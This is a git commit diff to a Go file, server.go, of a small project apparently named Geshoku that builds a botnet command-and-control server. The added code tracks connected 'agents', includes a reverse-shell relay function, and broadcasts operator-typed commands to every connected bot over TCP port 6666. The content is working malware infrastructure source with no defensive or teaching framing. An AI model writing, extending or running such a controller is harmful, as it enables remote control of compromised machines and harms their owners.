7043a710650c1fa693bf42646cd76c85b251afdd
Master000123000 <33176869+Master000123000@users.noreply.github.com>
2024-10-07 17:27:16 +0100

    Update server.go

--- src/miko-server/server.go
+++ src/miko-server/server.go
@@ -3,9 +3,14 @@ package main
 import (
 	"bufio"
 	"fmt"
+	"io"
 	"net"
 	"os"
+	"sync"
 )
+
+var agent_list = make(map[string]net.Conn)
+var lock = &sync.Mutex{}
 
 func write_welcome() {
 	fmt.Println("-----------Geshoku------------")
@@ -14,50 +19,69 @@ func write_welcome() {
 	fmt.Println("------------------------------")
 }
 
+func rev_shell(conn net.Conn) {
+	defer conn.Close()
+	fmt.Println("[Info] Client connected:", conn.RemoteAddr())
+	fmt.Println("[Info] Waiting for commands to send to the client")
+	go io.Copy(conn, os.Stdin)
+	fmt.Println("test")
+	io.Copy(os.Stdout, conn)
+}
+
 func handle_client(conn net.Conn) {
 	defer conn.Close()
 	buffer := make([]byte, 1024)
-	fmt.Println("[Info] Client connected:", conn.RemoteAddr())
-	fmt.Println("[Info] Waiting for commands to send to the client")
-	//var command string
+	lock.Lock()
+	agentID := conn.RemoteAddr().String()
+	agent_list[agentID] = conn
+	lock.Unlock()
+
+	fmt.Printf("\n[Info] New agent connected: %s\n", agentID)
 	for {
-		for i := range buffer {
-			buffer[i] = 0
-		}
-		fmt.Print("Shell> ")
-		in := bufio.NewReader(os.Stdin)
-		command, err := in.ReadString('\n')
+		//buffer = buffer[:0]
+		_, err := conn.Read(buffer)
 		if err != nil {
-			fmt.Println("[Err] Failed to read command:", err)
-			continue
+			fmt.Println("[Info] Agent disconnected")
+			lock.Lock()
+			delete(agent_list, agentID)
+			lock.Unlock()
+			return
+
 		}
-		if command == "quit" {
-			fmt.Println("[Info] Quitting... Closing connection to client.")
-			break
-		}
-		_, err = conn.Write([]byte(command + "\n"))
-		if err != nil {
-			fmt.Println("[Err] Failed to send command to client:", err)
-			break
-		}
-		fmt.Println("Reading data")
-		_, err = conn.Read(buffer)
-		if err != nil {
-			fmt.Println("[Err] Failed to receive response from client:", err)
-			break
-		}
-		println("data received")
-		response := string(buffer[:])
-		if response != "" {
-			fmt.Println(string(buffer[:]))
-		}
+		fmt.Printf("[Info] %s : %s\n", agentID, buffer)
 	}
 }
 
+func send_orders() {
+	reader := bufio.NewReader(os.Stdin)
+	noBotsMsg := false
+	for {
+		lock.Lock()
+		if len(agent_list) == 0 {
+			if !noBotsMsg {
+				fmt.Println("[Info] No bots available, waiting...")
+				noBotsMsg = true
+			}
+			lock.Unlock()
+			continue
+		}
+		lock.Unlock()
+		fmt.Print("Command> ") //Asks for commands at the start of the program before bots are even connected, add checker to ensure bots are connected
+		command, _ := reader.ReadString('\n')
+		lock.Lock()
+		for id, conn := range agent_list {
+			_, err := conn.Write([]byte(command))
+			if err != nil {
+				fmt.Printf("[Err] Failed to send command to %s: %v\n", id, err)
+			}
+		}
+		lock.Unlock()
+	}
+
+}
+
 func start_server() {
-	fmt.Println("[Info] Trying to start server")
 	listener, err := net.Listen("tcp", ":6666")
-	fmt.Println("started server")
 	if err != nil {
 		fmt.Println("[Err] Server start failed: ", err)
 		return
@@ -74,5 +98,6 @@ func start_server() {
 
 func main() {
 	write_welcome()
-	start_server()
+	go start_server()
+	send_orders()
 }
